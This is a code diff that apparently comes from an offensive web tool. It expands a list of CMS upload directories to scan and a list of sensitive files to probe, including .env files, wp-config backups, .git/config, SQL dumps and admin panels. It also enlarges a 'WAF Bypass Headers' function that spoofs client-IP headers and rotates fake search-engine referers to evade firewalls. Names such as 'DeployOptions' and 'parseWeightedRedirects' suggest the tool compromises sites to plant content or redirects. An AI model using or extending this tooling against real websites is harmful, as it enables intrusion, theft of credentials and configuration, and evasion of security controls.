@@ -217,10 +217,18 @@ export interface DeployOptions {
 // ─── Constants ───
 
 const UPLOAD_SCAN_PATHS = [
+  // WordPress paths (most common CMS)
   "/wp-content/uploads/",
   "/wp-content/themes/",
   "/wp-content/plugins/",
+  "/wp-content/uploads/" + new Date().getFullYear() + "/",
+  "/wp-content/uploads/" + new Date().getFullYear() + "/" + String(new Date().getMonth() + 1).padStart(2, "0") + "/",
   "/wp-includes/",
+  "/wp-content/cache/",
+  "/wp-content/upgrade/",
+  "/wp-content/languages/",
+  "/wp-content/mu-plugins/",
+  // Generic upload paths
   "/images/",
   "/uploads/",
   "/media/",
@@ -233,23 +241,94 @@ const UPLOAD_SCAN_PATHS = [
   "/data/",
   "/backup/",
   "/temp/",
+  // Additional CMS paths
+  "/sites/default/files/",    // Drupal
+  "/storage/app/public/",     // Laravel
+  "/public/storage/",         // Laravel public
+  "/static/",                 // Django/Flask
+  "/user/pages/",             // Grav CMS
+  "/system/",                 // Grav CMS
+  "/application/files/",      // Concrete5
+  "/typo3temp/",              // TYPO3
+  "/fileadmin/",              // TYPO3
+  "/var/cache/",              // Magento
+  "/pub/media/",              // Magento 2
+  "/pub/static/",             // Magento 2
+  // Hidden/misc paths
+  "/.well-known/",
+  "/cgi-bin/",
+  "/logs/",
+  "/old/",
+  "/bak/",
+  "/test/",
+  "/demo/",
 ];
 
 const VULN_PATHS = [
+  // WordPress
   "/wp-admin/admin-ajax.php",
   "/xmlrpc.php",
   "/wp-json/wp/v2/",
+  "/wp-json/wp/v2/users",
+  "/wp-json/wp/v2/posts",
+  "/wp-json/wp/v2/pages",
+  "/wp-json/wp/v2/media",
+  "/wp-json/oembed/1.0/embed",
   "/wp-login.php",
+  "/wp-admin/install.php",
+  "/wp-admin/setup-config.php",
+  "/wp-cron.php",
   "/readme.html",
   "/license.txt",
+  // Config/Info leaks
   "/.env",
+  "/.env.local",
+  "/.env.production",
+  "/.env.backup",
   "/config.php",
+  "/configuration.php",
+  "/wp-config.php.bak",
+  "/wp-config.php~",
+  "/wp-config.php.save",
+  "/wp-config.old",
   "/phpinfo.php",
   "/info.php",
   "/test.php",
+  "/p.php",
+  "/i.php",
+  // Git/SVN exposure
   "/.git/HEAD",
+  "/.git/config",
+  "/.svn/entries",
+  "/.svn/wc.db",
+  // Server info
   "/server-status",
   "/server-info",
+  "/.htaccess",
+  "/web.config",
+  // Debug/admin panels
+  "/debug",
+  "/debug.log",
+  "/wp-content/debug.log",
+  "/error_log",
+  "/error.log",
+  "/_profiler",
+  "/adminer.php",
+  "/phpmyadmin/",
+  // Backup files
+  "/backup.sql",
+  "/db.sql",
+  "/database.sql",
+  "/dump.sql",
+  "/backup.zip",
+  "/backup.tar.gz",
+  "/site.zip",
+  // API endpoints
+  "/api/",
+  "/api/v1/",
+  "/api/v2/",
+  "/graphql",
+  "/.well-known/security.txt",
 ];
 
 const USER_AGENTS = [
@@ -534,21 +613,47 @@ function parseWeightedRedirects(text: string): WeightedRedirect[] {
 // ─── WAF Bypass Headers ───
 
 function getBypassHeaders(targetUrl: string): Record<string, string> {
-  const ip = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.1`;
+  const ip = `${Math.floor(Math.random() * 223) + 1}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 254) + 1}`;
+  const ip2 = `${Math.floor(Math.random() * 223) + 1}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 254) + 1}`;
+  const domain = targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
+  // Rotate referer to look more natural
+  const referers = [
+    `${targetUrl}/wp-admin/`,
+    `https://www.google.com/search?q=${domain}`,
+    `https://www.google.co.th/search?q=${domain}`,
+    `https://th.search.yahoo.com/search?p=${domain}`,
+    targetUrl,
+    `${targetUrl}/`,
+  ];
   return {
     "User-Agent": randomUA(),
-    "X-Forwarded-For": ip,
+    "X-Forwarded-For": `${ip}, ${ip2}`,
     "X-Real-IP": ip,
     "X-Original-URL": "/",
     "X-Rewrite-URL": "/",
     "X-Custom-IP-Authorization": ip,
     "X-Originating-IP": ip,
-    "Referer": `${targetUrl}/wp-admin/`,
-    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-    "Accept-Language": "en-US,en;q=0.5",
-    "Accept-Encoding": "gzip, deflate",
+    "X-Remote-IP": ip,
+    "X-Remote-Addr": ip,
+    "X-Client-IP": ip2,
+    "X-Host": domain,
+    "X-Forwarded-Host": domain,
+    "True-Client-IP": ip,
+    "CF-Connecting-IP": ip,
+    "Fastly-Client-IP": ip,
+    "X-Azure-ClientIP": ip,
+    "X-Cluster-Client-IP": ip,
+    "Referer": referers[Math.floor(Math.random() * referers.length)],
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+    "Accept-Language": "th-TH,th;q=0.9,en-US;q=0.8,en;q=0.7",
+    "Accept-Encoding": "gzip, deflate, br",
     "Connection": "keep-alive",
     "Cache-Control": "no-cache",
+    "Pragma": "no-cache",
+    "Sec-Fetch-Dest": "document",
+    "Sec-Fetch-Mode": "navigate",
+    "Sec-Fetch-Site": "cross-site",
+    "Upgrade-Insecure-Requests": "1",
   };
 }
 
